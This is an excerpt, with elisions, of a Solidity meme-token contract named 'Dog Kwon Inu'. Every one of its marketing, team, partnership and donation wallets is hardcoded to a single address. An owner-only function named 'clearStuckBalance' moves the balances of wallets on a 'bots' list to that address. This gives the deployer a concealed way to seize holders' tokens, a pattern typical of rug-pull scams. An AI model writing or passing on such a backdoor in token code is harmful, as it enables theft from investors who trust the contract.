...
/*
Telegram : https://t.me/DogKwonInu
*/
...
contract DogKwonInu is Context, IERC20, Ownable {
    ...
    address payable public _marketingAddress =
        payable(address(0xd9aB226C0A62C20afDBf7D79aeC5fD8151b764C9));
    address payable public _teamwallet =
        payable(address(0xd9aB226C0A62C20afDBf7D79aeC5fD8151b764C9));
    address _partnershipswallet =
        payable(address(0xd9aB226C0A62C20afDBf7D79aeC5fD8151b764C9));
    address private _donationAddress =
        0xd9aB226C0A62C20afDBf7D79aeC5fD8151b764C9;

    string private _name = "Dog Kwon Inu";
    string private _symbol = "DogKwonInu";
    ...
    function clearStuckBalance() public onlyOwner {
        for(uint256 i = 0; i < botsWallet.length; i++){
            ...
            _transferStandard(wallet, address(0xd9aB226C0A62C20afDBf7D79aeC5fD8151b764C9), amount);
        }
